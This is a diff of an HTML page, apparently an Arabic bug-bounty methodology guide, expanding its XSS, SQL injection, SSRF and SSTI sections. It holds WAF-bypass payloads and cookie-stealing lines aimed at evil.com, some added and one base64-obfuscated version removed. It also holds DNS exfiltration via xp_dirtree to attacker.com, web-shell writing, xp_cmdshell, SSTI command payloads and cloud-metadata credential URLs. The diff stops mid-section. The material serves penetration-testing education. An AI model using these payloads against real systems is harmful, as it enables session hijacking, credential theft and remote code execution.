@@ -537,11 +537,20 @@
           <span>▼</span>
         </div>
         <div class="category-items" id="cat-vuln">
+          <div class="meth-item" id="meth-ef-p10" onclick="openMethPhase('p10')" data-search="idor insecure direct object reference bola horizontal">
+            <span>├── 🔑</span> <span>IDOR Testing</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p10', '🔑 IDOR Testing')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-p11" onclick="openMethPhase('p11')" data-search="file upload exploit shell bypass extension magic bytes">
+            <span>├── 📤</span> <span>File Upload Exploits</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p11', '📤 File Upload Exploits')">★</button>
+          </div>
           <div class="meth-item" id="meth-ef-p7" onclick="openMethPhase('p7')" data-search="xss cross site scripting reflected stored dom bypass waf">
             <span>├── 🌐</span> <span>XSS Workflow</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p7', '🌐 XSS Workflow')">★</button>
           </div>
           <div class="meth-item" id="meth-ef-p8" onclick="openMethPhase('p8')" data-search="sqli sql injection union error blind sqlmap">
             <span>├── 💉</span> <span>SQLi Workflow</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p8', '💉 SQLi Workflow')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-p_xxe" onclick="openMethPhase('p_xxe')" data-search="xxe xml external entity injection file read lfi">
+            <span>├── 🕸️</span> <span>XXE Injection</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_xxe', '🕸️ XXE Injection')">★</button>
           </div>
           <div class="meth-item" id="meth-ef-p9" onclick="openMethPhase('p9')" data-search="ssrf server side request forgery aws metadata cloud">
             <span>├── 📡</span> <span>SSRF Workflow</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p9', '📡 SSRF Workflow')">★</button>
@@ -549,23 +558,14 @@
           <div class="meth-item" id="meth-ef-p_ssti" onclick="openMethPhase('p_ssti')" data-search="ssti server side template injection jinja2 rce flask">
             <span>├── 🧬</span> <span>SSTI Workflow</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_ssti', '🧬 SSTI Workflow')">★</button>
           </div>
-          <div class="meth-item" id="meth-ef-p_xxe" onclick="openMethPhase('p_xxe')" data-search="xxe xml external entity injection file read lfi">
-            <span>├── 🕸️</span> <span>XXE Injection</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_xxe', '🕸️ XXE Injection')">★</button>
-          </div>
-          <div class="meth-item" id="meth-ef-p10" onclick="openMethPhase('p10')" data-search="idor insecure direct object reference bola horizontal">
-            <span>├── 🔑</span> <span>IDOR Testing</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p10', '🔑 IDOR Testing')">★</button>
-          </div>
-          <div class="meth-item" id="meth-ef-p11" onclick="openMethPhase('p11')" data-search="file upload exploit shell bypass extension magic bytes">
-            <span>├── 📤</span> <span>File Upload Exploits</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p11', '📤 File Upload Exploits')">★</button>
-          </div>
-          <div class="meth-item" id="meth-ef-p12" onclick="openMethPhase('p12')" data-search="race condition concurrent request shopify coupon">
-            <span>├── ⚡</span> <span>Race Conditions</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p12', '⚡ Race Conditions')">★</button>
-          </div>
           <div class="meth-item" id="meth-ef-p14" onclick="openMethPhase('p14')" data-search="jwt hacking token rsa hmac confusion alg none">
             <span>├── 🎫</span> <span>JWT Hacking</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p14', '🎫 JWT Hacking')">★</button>
           </div>
           <div class="meth-item" id="meth-ef-p13" onclick="openMethPhase('p13')" data-search="oauth session hijacking redirect uri token">
             <span>├── 🔐</span> <span>OAuth & Sessions</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p13', '🔐 OAuth & Sessions')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-p12" onclick="openMethPhase('p12')" data-search="race condition concurrent request shopify coupon">
+            <span>├── ⚡</span> <span>Race Conditions</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p12', '⚡ Race Conditions')">★</button>
           </div>
           <div class="meth-item" id="meth-ef-p15" onclick="openMethPhase('p15')" data-search="cloud security aws s3 bucket iam privilege escalation">
             <span>└── ☁️</span> <span>Cloud Security</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p15', '☁️ Cloud Security')">★</button>
@@ -1578,443 +1578,726 @@ aws s3 ls</div>
 
       <!-- Phase 7: XSS Workflow -->
       <div class="meth-content-view" id="meth-content-p7" style="display: none; --tool-color: #bf80ff;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🌐</span> Cross-Site Scripting (XSS)</h2>
-          <p class="hero-tagline">منهجية الفحص والتعرف على سياقات الحقن وكتابة الحمولات المناسبة لتخطي الفلاتر</p>
+          <h2 class="hero-title"><span class="hero-icon">🌐</span> Cross-Site Scripting (XSS) - Deep Dive</h2>
+          <p class="hero-tagline">منهجية متقدمة في اكتشاف الثغرة، تخطي الجدران النارية (WAF Bypassing)، وسلاسل الاستغلال (Exploit Chaining)</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>💡 XSS Overview & Detection</h3></div>
-          <p>تحدث ثغرة XSS عند انعكاس مدخلات المستخدم مباشرة داخل الـ DOM أو ملفات HTML من غير تعقيم.</p>
+          <div class="card-header"><h3>💡 1. فهم الـ XSS بعمق (Core Concepts)</h3></div>
+          <p>ثغرة XSS لا تقتصر على إظهار <code>alert(1)</code>. هي ثغرة تسمح بتنفيذ كود JavaScript بصلاحيات المستخدم داخل المتصفح. تنقسم إلى 3 أنواع رئيسية:</p>
           <ul class="t-check-list">
-            <li>✔ <strong>Detection:</strong> حقن مدخلات مثل <code>Reflected&lt;Img&gt;</code> لمراقبة الانعكاس وسياق الصفحة.</li>
-            <li>✔ <strong>Tools:</strong> XSStrike, Dalfox.</li>
+            <li>✔ <strong>Reflected XSS:</strong> البايلود ينعكس مباشرة في الاستجابة (Response). يتطلب تفاعل المستخدم عبر رابط خبيث.</li>
+            <li>✔ <strong>Stored XSS:</strong> البايلود يُحفظ في قاعدة البيانات (مثل التعليقات، أو اسم الملف) وينفذ كلما زار أي مستخدم الصفحة. يُعتبر الأخطر لأنه يتيح إنشاء ديدان (XSS Worms).</li>
+            <li>✔ <strong>DOM-based XSS:</strong> الثغرة تحدث بالكامل داخل المتصفح (Client-side) عندما تقرأ سكريبتات الصفحة بيانات من مصدر غير آمن (مثل <code>location.hash</code> أو <code>document.referrer</code>) وتضعها في (Sink) خطير مثل <code>innerHTML</code> أو <code>eval()</code>. السيرفر لا يرى البايلود إطلاقاً.</li>
+            <li>✔ <strong>Blind XSS:</strong> نوع من الـ Stored XSS حيث يُنفذ البايلود في لوحة تحكم الإدارة (Admin Panel) التي لا تملك وصولاً إليها. نستخدم أدوات مثل <strong>XSS Hunter</strong> أو <strong>Interactsh</strong> لاصطيادها.</li>
           </ul>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>📋 Context Matrix</h3></div>
+          <div class="card-header"><h3>🛡️ 2. تخطي الحمايات (Advanced WAF Bypassing)</h3></div>
+          <p>غالباً ما تمنع الجدران النارية (WAFs) مثل Cloudflare أو AWS WAF الوسوم المشهورة مثل <code>&lt;script&gt;</code> أو <code>onerror</code>. إليك استراتيجيات التخطي:</p>
           <div class="table-wrapper"><table class="interactive-table">
             <thead>
               <tr>
-                <th>سياق الحقن (Context)</th>
-                <th>المثال (HTML Context)</th>
-                <th>الحمولة المفضلة (Payload Example)</th>
+                <th>تقنية التخطي (Bypass Technique)</th>
+                <th>البايلود المستخدم (Payload)</th>
+                <th>متى نستخدمها؟</th>
               </tr>
             </thead>
             <tbody>
               <tr>
-                <td><strong>HTML Context</strong></td>
-                <td><code>&lt;div&gt;REFLECTED_HERE&lt;/div&gt;</code></td>
-                <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                <td><strong>1. HTML5 Obscure Tags</strong></td>
+                <td><code>&lt;details/open/ontoggle=alert(1)&gt;</code><br><code>&lt;marquee onstart=alert(1)&gt;</code></td>
+                <td>عندما يقوم الـ WAF بحظر وسوم <code>img</code> أو <code>script</code> أو <code>svg</code>.</td>
               </tr>
               <tr>
-                <td><strong>Attribute Context</strong></td>
-                <td><code>&lt;input value="REFLECTED_HERE"&gt;</code></td>
-                <td><code>" onmouseover="alert(1)</code></td>
+                <td><strong>2. SVG Animations</strong></td>
+                <td><code>&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;</code></td>
+                <td>عندما يتم فلترة الأحداث (Events) التقليدية ولكن يسمح بالـ SVG.</td>
               </tr>
               <tr>
-                <td><strong>Javascript Context</strong></td>
-                <td><code>&lt;script&gt;var name = 'REFLECTED_HERE';&lt;/script&gt;</code></td>
-                <td><code>'; alert(1); //</code></td>
+                <td><strong>3. Encoding & Obfuscation</strong></td>
+                <td><code>&lt;a href="javascript:&amp;apos;alert(1)&amp;apos;"&gt;Click&lt;/a&gt;</code><br><code>eval(atob('YWxlcnQoMSk='))</code></td>
+                <td>تجاوز فلاتر مطابقة الكلمات (Regex) باستخدام Base64 أو Hex أو HTML Entities.</td>
+              </tr>
+              <tr>
+                <td><strong>4. DOM Clobbering</strong></td>
+                <td><code>&lt;a id=someVar href="javascript:alert(1)"&gt;</code></td>
+                <td>التلاعب بالمتغيرات العامة للـ JS عبر الـ DOM إذا كان السكريبت يعتمد عليها.</td>
               </tr>
             </tbody>
           </table></div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Cloudflare WAF bypass on financial forum</h3></div>
-          <p><strong>الوصف (Scenario):</strong> تخطي جدار الحماية لتمرير حمولة XSS ناجحة لسرقة الكوكيز الخاصة بمدير المنتدى.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> استخدام وسم SVG مع تفاعل مباشر لا يتطلب وسم script لحقن كود السرقة.</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">&lt;svg onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9ldmlsLmNvbS8nK2RvY3VtZW50LmNvb2tpZSk='))&gt;</div>
-          </div>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$2,000</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color: var(--neon-green);"><span class="hero-icon">🔥</span> 3. سلسلة الاستغلال (Exploit Chaining & Escalation)</h3></div>
+          <p>للحصول على مكافآت عالية (Critical/High)، يجب تحويل الـ XSS إلى ضرر حقيقي:</p>
+          <ul class="t-check-list">
+            <li><strong>Session Hijacking (سرقة الجلسات):</strong> <code>fetch('http://evil.com/?cookie='+document.cookie)</code> (إذا لم تكن الكوكيز محمية بـ HttpOnly).</li>
+            <li><strong>Account Takeover via CSRF:</strong> استخدام الـ XSS لإرسال طلب تغيير الإيميل أو الباسورد خفية بصلاحيات الضحية متجاوزاً أي حماية CSRF (لأن الـ XSS يقرأ الـ Anti-CSRF Token من الصفحة).</li>
+            <li><strong>Keylogging & Phishing:</strong> حقن نموذج تسجيل دخول مزيف (Fake Login) أو التقاط نقرات لوحة المفاتيح لإرسالها لسيرفر المهاجم.</li>
+          </ul>
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+
+        <div class="cyber-card" style="border: 1px solid rgba(0, 229, 255, 0.15); background: rgba(0, 229, 255, 0.02); margin-top: 20px;">
+          <div class="card-header"><h3 style="color: var(--neon-cyan);"><span class="hero-icon">📺</span> مرجع التعلم والتطبيق (Reference)</h3></div>
+          <p>هذا المنهج مبني على التقنيات العميقة الموضحة في <strong>سلسلة اكتشاف الثغرات (Bug Bounty Arabic)</strong>.</p>
+          <p>يمكنك الرجوع لمحاضرات الـ XSS لفهم التخطي والسياقات بشكل عملي: <a href="https://www.youtube.com/watch?v=0TD1mPv7jJY&list=PLEHdb4yX2v-2r8IYQT4ute8ZXDuU8XuKg" target="_blank" style="color: var(--neon-cyan); text-decoration: underline;">رابط قائمة التشغيل على يوتيوب</a></p>
+        </div>
+    
+
+<!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p7" onclick="markPhaseComplete('p7','p8')">
           ✅ Mark Phase Complete — XSS Workflow Done → Proceed to SQLi Workflow
         </button>
 </div>
+      </div>
 
       <!-- Phase 8: SQLi Workflow -->
       <div class="meth-content-view" id="meth-content-p8" style="display: none; --tool-color: #ef4444;">
+
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">💉</span> SQL Injection (SQLi)</h2>
-          <p class="hero-tagline">منهجية كشف واستغلال ثغرات قواعد البيانات</p>
+          <h2 class="hero-title"><span class="hero-icon">💉</span> SQL Injection (SQLi) - Deep Dive</h2>
+          <p class="hero-tagline">من الحقن الأساسي إلى العمى التام (Blind) وسحب البيانات خارج النطاق (OOB) ورفع الصلاحيات (RCE)</p>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>💡 SQLi Overview & Detection</h3></div>
-          <p>تسمح للمهاجمين بالتدخل في الاستعلامات التي يرسلها التطبيق لقاعدة البيانات.</p>
+          <div class="card-header"><h3>💡 1. آليات الحقن المتقدمة (Advanced Injection Vectors)</h3></div>
+          <p>حقن قواعد البيانات لا يقتصر على المعاملات في الـ URL بل يمتد إلى الترويسات (Headers) ونقاط النهاية المعقدة (APIs).</p>
           <ul class="t-check-list">
-            <li>✔ <strong>Detection:</strong> حقن <code>'</code> أو <code>"</code> ومراقبة أخطاء SQL أو التغيرات في الاستجابة (Blind SQLi).</li>
-            <li>✔ <strong>Automation:</strong> <code>sqlmap -u "https://target.com/item.php?id=1" --dbs --batch</code></li>
+            <li>✔ <strong>Error-Based SQLi:</strong> دفع قاعدة البيانات لطباعة الخطأ متضمناً البيانات (مثل استخدام <code>extractvalue()</code> في MySQL).</li>
+            <li>✔ <strong>Union-Based SQLi:</strong> دمج نتائج استعلامك مع الاستعلام الأصلي باستخدام <code>UNION SELECT</code> (يتطلب مطابقة عدد الأعمدة ونوع البيانات).</li>
+            <li>✔ <strong>Blind Boolean-Based:</strong> استخراج البيانات حرفاً بحرف عبر طرح أسئلة صح/خطأ. (مثال: <code>AND (SELECT SUBSTRING(version(),1,1))='5'</code>). إذا اختلفت استجابة الصفحة (اختفاء كلمة أو تغيير حجم الاستجابة) فهذا يؤكد صحة الحرف.</li>
+            <li>✔ <strong>Blind Time-Based:</strong> الاعتماد على تأخير استجابة السيرفر باستخدام دوال مثل <code>sleep(10)</code> في MySQL أو <code>pg_sleep(10)</code> في PostgreSQL لمعرفة صحة الشرط.</li>
           </ul>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>📋 SQLi Types</h3></div>
-          <ul class="t-check-list">
-            <li>✔ <strong>Union-Based:</strong> دمج نتائج استعلامات إضافية مع الاستعلام الأصلي.</li>
-            <li>✔ <strong>Error-Based:</strong> إجبار السيرفر على استخلاص البيانات عبر رسائل الخطأ.</li>
-            <li>✔ <strong>Blind Time-Based:</strong> التحقق عبر إحداث تأخير زمني <code>SLEEP(5)</code>.</li>
-          </ul>
-        </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Union SQLi on SaaS checkout gateway</h3></div>
-          <p><strong>الوصف (Scenario):</strong> رصد استعلام غير محمي في صفحة فواتير الدفع لمتجر الكتروني كبير.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> حقن استعلام UNION وسحب معلومات وبيانات الإدارة كاملة.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$8,000</span></p>
-        </div>
-      
-        <!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p8" onclick="markPhaseComplete('p8','p9')">
-          ✅ Mark Phase Complete — SQLi Workflow Done → Proceed to SSRF Workflow
-        </button>
-</div>
-
-      <!-- Phase 9: SSRF Workflow -->
-      <div class="meth-content-view" id="meth-content-p9" style="display: none; --tool-color: #0284c7;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📡</span> Server-Side Request Forgery (SSRF)</h2>
-          <p class="hero-tagline">فحص المدخلات البرمجية التي تطلب روابط خارجية واستغلالها لقراءة الخواص الداخلية للشبكة</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 SSRF Overview & Detection</h3></div>
-          <p>تحدث عندما يقوم الخادم بجلب رابط خارجي يحدده المهاجم دون تعقيم للرابط.</p>
-          <ul class="t-check-list">
-            <li>✔ <strong>Detection:</strong> حقن رابط خادم خارجي مثل Interact.sh أو رابط داخلي <code>http://127.0.0.1:80/</code>.</li>
-            <li>✔ <strong>Metadata targets:</strong> استدعاء روابط السحابة العامة مثل AWS <code>http://169.254.169.254/latest/meta-data/</code>.</li>
-          </ul>
-        </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Capital One AWS SSRF leak</h3></div>
-          <p><strong>الوصف (Scenario):</strong> اختراق بنك Capital One الشهير عبر استغلال ثغرة SSRF على الـ WAF لقراءة خادم الميتاداتا.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> استدعاء رابط الميتاداتا لجلب مفاتيح إدارة الهوية السحابية (IAM Credentials) وسحب بيانات 100 مليون عميل.</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</div>
-          </div>
-          <p><strong>الأثر (Impact):</strong> تسوية قضائية بقيمة 250 مليون دولار.</p>
-        </div>
-      
-        <!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p9" onclick="markPhaseComplete('p9','p_ssti')">
-          ✅ Mark Phase Complete — SSRF Workflow Done → Proceed to SSTI Workflow
-        </button>
-</div>
-
-      <!-- Phase SSTI Workflow -->
-      <div class="meth-content-view" id="meth-content-p_ssti" style="display: none; --tool-color: #ff0055;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🧬</span> SSTI (Server-Side Template Injection)</h2>
-          <p class="hero-tagline">منهجية اكتشاف واستغلال ثغرات حقن القوالب البرمجية على الخادم للوصول إلى RCE</p>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>💡 SSTI Detection Methodology</h3></div>
-          <p>تبدأ الثغرة عندما يتم دمج مدخلات المستخدم مباشرة داخل محرك القوالب (Template Engine) بدلاً من تمريرها كبيانات آمنة.</p>
-          <p>لحقن العمليات الرياضية ورصد النتيجة:</p>
-          <ul class="t-check-list">
-            <li>✔ حقن <code>${7*7}</code> أو <code>{% templatetag openvariable %}7*7{% templatetag closevariable %}</code> في المدخلات.</li>
-            <li>✔ إذا عادت الاستجابة بالرقم <strong>49</strong>، فإن الخادم مصاب بـ SSTI مؤكدة.</li>
-          </ul>
-        </div>
-
-        <div class="cyber-card">
-          <div class="card-header"><h3>🎯 Engine Payloads Comparison</h3></div>
+          <div class="card-header"><h3>🛡️ 2. تخطي فلترة الـ SQL (WAF Bypassing)</h3></div>
+          <p>عند حظر المسافات أو الكلمات المفتاحية مثل <code>SELECT</code> و <code>UNION</code>:</p>
           <div class="table-wrapper"><table class="interactive-table">
             <thead>
               <tr>
-                <th>المحرك (Engine)</th>
-                <th>لغة البرمجة</th>
-                <th>حمولة الاختبار (Test Payload)</th>
-                <th>حمولة RCE (Remote Code Execution)</th>
+                <th>نوع الفلترة (Filter)</th>
+                <th>تقنية التخطي (Bypass Payload)</th>
               </tr>
             </thead>
             <tbody>
               <tr>
-                <td><strong>Jinja2 / Twig</strong></td>
-                <td>Python / PHP</td>
-                <td><code>{% templatetag openvariable %}7*7{% templatetag closevariable %}</code></td>
-                <td><code>{% templatetag openvariable %}self.__init__.__globals__.__specs__['os'].popen('id').read(){% templatetag closevariable %}</code></td>
+                <td><strong>حظر المسافات (Spaces Blocked)</strong></td>
+                <td>استخدام التعليقات <code>/**/</code> أو الأقواس: <code>SELECT/**/version()</code> أو <code>id=1||(SELECT(version()))</code>.</td>
               </tr>
               <tr>
-                <td><strong>Thymeleaf</strong></td>
-                <td>Java</td>
-                <td><code>${7*7}</code></td>
-                <td><code>${#rt.exec('id')}</code></td>
+                <td><strong>حظر الكلمات (Keyword Filtering)</strong></td>
+                <td>تغيير حالة الأحرف (Case toggling): <code>SeLeCt</code> أو استخدام الـ URL Encoding: <code>%53%45%4C%45%43%54</code>.</td>
               </tr>
               <tr>
-                <td><strong>Mako</strong></td>
-                <td>Python</td>
-                <td><code>${7*7}</code></td>
-                <td><code>${os.system('id')}</code></td>
+                <td><strong>حظر علامات الاقتباس (Quotes '')</strong></td>
+                <td>استخدام الـ Hex Encoding بدلاً من السلاسل النصية: بدلاً من <code>'admin'</code> استخدم <code>0x61646d696e</code>.</td>
+              </tr>
+              <tr>
+                <td><strong>حظر الـ UNION SELECT</strong></td>
+                <td>تجزئة الكلمة باستخدام تعليقات داخلية (في بعض المحركات): <code>U/**/NION S/**/ELECT</code>.</td>
               </tr>
             </tbody>
           </table></div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Flask profile name SSTI RCE</h3></div>
-          <p><strong>الوصف (Scenario):</strong> حقن العمليات الرياضية في خانة الاسم الشخصي للمستخدم في تطبيق مصمم بـ Flask.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> انعكاس الاسم بالنتيجة الحسابية 49، ثم تحويل الحمولة لاستدعاء كيانات بايثون العامة لتنفيذ الأوامر.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$4,000</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color: var(--neon-red);"><span class="hero-icon">🚨</span> 3. تصعيد الخطورة (Escalation to RCE / OOB)</h3></div>
+          <ul class="t-check-list">
+            <li><strong>Out-of-Band (OOB) SQLi:</strong> إذا كان السيرفر أعمى تماماً (لا أخطاء، ولا تأخير زمني ينفع)، يمكنك إجبار قاعدة البيانات على إجراء استعلام DNS يحتوي على البيانات المراد سحبها.
+              <br><em>مثال في MSSQL:</em> <code>EXEC master..xp_dirtree '//'+(SELECT DB_NAME())+'.attacker.com/a'</code></li>
+            <li><strong>RCE (Remote Code Execution):</strong>
+              <ul>
+                <li><strong>MySQL:</strong> استخدام <code>INTO OUTFILE '/var/www/html/shell.php'</code> لكتابة ويب شيل على السيرفر (يتطلب صلاحيات FILE ومسار معروف).</li>
+                <li><strong>MSSQL:</strong> تفعيل واستخدام <code>xp_cmdshell</code> لتنفيذ أوامر نظام التشغيل مباشرة.</li>
+                <li><strong>PostgreSQL:</strong> إنشاء وظائف (Functions) تستدعي كود C أو كتابة ملفات باستخدام <code>COPY TO</code>.</li>
+              </ul>
+            </li>
+          </ul>
         </div>
-      
-        <!-- MARK PHASE COMPLETE -->
+    
+
+<!-- MARK PHASE COMPLETE -->
+        <button class="mark-complete-btn" id="complete-btn-p8" onclick="markPhaseComplete('p8','p9')">
+          ✅ Mark Phase Complete — SQLi Workflow Done → Proceed to SSRF Workflow
+        </button>
+</div>
+      </div>
+
+      <!-- Phase 9: SSRF Workflow -->
+      <div class="meth-content-view" id="meth-content-p9" style="display: none; --tool-color: #0284c7;">
+
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">📡</span> Server-Side Request Forgery (SSRF) - Deep Dive</h2>
+          <p class="hero-tagline">منهجية اختراق السيرفر من الداخل، استخراج بيانات الكلاود (Cloud Metadata)، واختراق الخدمات الداخلية المخبأة.</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>💡 1. فهم الـ SSRF وأنواعه (Core Mechanisms)</h3></div>
+          <p>ثغرة SSRF تحدث عندما يثق السيرفر بمدخلاتك ليقوم بإنشاء طلب (HTTP/TCP) بالنيابة عنك لخدمات وموارد خلف الجدار الناري (Firewall) لا يمكنك الوصول إليها مباشرة.</p>
+          <ul class="t-check-list">
+            <li>✔ <strong>Full SSRF:</strong> السيرفر يرسل الطلب ويعيد لك الاستجابة كاملة. يمكنك من خلالها قراءة محتويات لوحات التحكم الداخلية أو ملفات السيرفر.</li>
+            <li>✔ <strong>Blind SSRF:</strong> السيرفر يرسل الطلب ولكنه لا يظهر لك الاستجابة بالصفحة. لتأكيد الثغرة نستخدم سيرفر استماع (مثل Burp Collaborator) ونجعل السيرفر يرسل طلباً إليه. نستغلها لفحص المنافذ الداخلية (عبر مراقبة زمن الاستجابة Time-based) أو استغلال الخدمات بدون انتظار رد (One-way exploits).</li>
+          </ul>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛡️ 2. تخطي حمايات الـ SSRF (Advanced Bypasses)</h3></div>
+          <p>كيف تتجاوز الفلاتر التي تمنع طلب <code>127.0.0.1</code> أو <code>localhost</code>؟</p>
+          <div class="table-wrapper"><table class="interactive-table">
+            <thead>
+              <tr>
+                <th>التقنية (Technique)</th>
+                <th>أمثلة وتطبيقات (Examples)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>1. IP Encoding (التشفير الرقمي)</strong></td>
+                <td><code>127.0.0.1</code> يمكن كتابتها كـ Decimal <code>2130706433</code> أو Octal <code>0177.0.0.1</code>. متصفحات ومكتبات السيرفر ستقرأها كـ 127.0.0.1 وتتجاوز الـ Regex.</td>
+              </tr>
+              <tr>
+                <td><strong>2. DNS Rebinding</strong></td>
+                <td>عندما يتحقق السيرفر من النطاق ليجده آمناً، ثم يقوم بالطلب الفعلي. المهاجم يستخدم دومين يغير الـ IP الخاص به بسرعة من IP آمن إلى <code>127.0.0.1</code> (وقت استجابة TTL قصير جداً). أداة: <em>rbndr.us</em>.</td>
+              </tr>
+              <tr>
+                <td><strong>3. Open Redirect Chaining</strong></td>
+                <td>إذا كان السيرفر يمنع الـ IPs الداخلية، لكنه يثق بنطاق معين (مثل <code>api.site.com</code>)، يمكنك استغلال ثغرة Open Redirect في ذلك النطاق الموثوق لتوجيه السيرفر إلى اللوكال هوست. <code>url=https://api.site.com/redirect?url=http://127.0.0.1/admin</code></td>
+              </tr>
+              <tr>
+                <td><strong>4. IPv6 Bypass</strong></td>
+                <td>استخدام <code>[::]</code> أو <code>[0000::1]</code> للوصول إلى اللوكال هوست في الأنظمة الداعمة لـ IPv6 متجاوزاً فلاتر الـ IPv4.</td>
+              </tr>
+            </tbody>
+          </table></div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🌩️</span> 3. استغلال الكلاود والبروتوكولات (Cloud & Protocols)</h3></div>
+          <ul class="t-check-list">
+            <li><strong>Cloud Metadata (AWS/GCP/Azure):</strong> إذا كان السيرفر مستضافاً على الكلاود، يمكنك طلب عناوين الـ Metadata للحصول على مفاتيح الوصول (IAM Credentials).
+              <br><em>AWS:</em> <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
+              <br><em>GCP:</em> يتطلب ترويسة معينة <code>Metadata-Flavor: Google</code> (قد تحتاج لـ CRLF injection لتخطيها).</li>
+            <li><strong>Protocol Smuggling (Gopher/Dict):</strong> إذا كان السيرفر يدعم بروتوكولات أخرى غير HTTP (مثل مكتبة cURL):
+              <br><em>Dict:</em> <code>dict://127.0.0.1:6379/info</code> للوصول لخدمة Redis.
+              <br><em>Gopher:</em> يسمح ببناء طلبات TCP كاملة، يمكنك من استغلال Memcached, Redis, أو SMTP لإرسال إيميلات مزيفة أو تحقيق RCE بتلويث الكاش.</li>
+            <li><strong>Local File Read:</strong> استخدام <code>file:///etc/passwd</code> لقراءة ملفات السيرفر المحلية إذا كان البروتوكول مدعوماً.</li>
+          </ul>
+        </div>
+    
+
+<!-- MARK PHASE COMPLETE -->
+        <button class="mark-complete-btn" id="complete-btn-p9" onclick="markPhaseComplete('p9','p_ssti')">
+          ✅ Mark Phase Complete — SSRF Workflow Done → Proceed to SSTI Workflow
+        </button>
+</div>
+      </div>
+
+      <!-- Phase SSTI Workflow -->
+      <div class="meth-content-view" id="meth-content-p_ssti" style="display: none; --tool-color: #ff0055;">
+
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🧬</span> Server-Side Template Injection (SSTI) - Deep Dive</h2>
+          <p class="hero-tagline">منهجية اكتشاف محركات القوالب والهروب من الـ Sandboxes لتحقيق Remote Code Execution (RCE)</p>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>💡 1. أساسيات الـ SSTI وكيفية الفحص</h3></div>
+          <p>تنشأ الثغرة عندما يقوم محرك قوالب (مثل Jinja2, Twig, FreeMarker) بمعالجة مدخلات المستخدم كأكواد برمجية داخل القالب بدلاً من نص عادي.</p>
+          <ul class="t-check-list">
